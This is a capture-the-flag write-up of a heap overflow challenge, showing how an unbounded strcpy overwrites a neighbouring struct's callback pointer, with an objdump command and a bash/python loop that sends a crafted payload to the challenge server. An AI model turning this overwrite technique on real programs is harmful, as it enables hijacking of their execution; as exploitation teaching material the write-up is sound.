# Heap Overflow -- 300 pts

**Category:** Binary Exploitation

## Overview

The program allocates two structs on the heap. Each struct has a name field and a callback function pointer. The vulnerability is that `strcpy` copies user input into the name field with no bounds checking.

## Approach

Looking at the source, the program does two `malloc` calls. The first struct `i1` gets a small name buffer (8 bytes) and the second struct `i2` has a callback function pointer. Since heap allocations sit next to each other in memory, overflowing `i1->name` with `strcpy` will eventually write into `i2`'s callback pointer.

Grabbed the address of `winner()`:

```bash
objdump -d vuln | grep winner
```

Got `0x080492b6`. Then I needed to figure out the exact byte count between the start of `i1->name` and `i2->callback`. On 32-bit glibc the heap metadata and struct layout puts this around 32 bytes but it varies so I just tried a few:

```bash
for i in 20 24 28 32 36; do
  echo "Trying offset $i"
  python3 -c "
import struct, sys
w = 0x080492b6
sys.stdout.buffer.write(b'A'*$i + struct.pack('<I', w))
" | nc foggy-cliff.picoctf.net 57984
done
```

One of those hit the callback pointer and redirected execution to `winner()`. Flag captured.

`strcpy` should basically never be used. It has zero concept of buffer length and will keep copying until it hits a null byte. This bug has been known for decades and it still shows up everywhere.
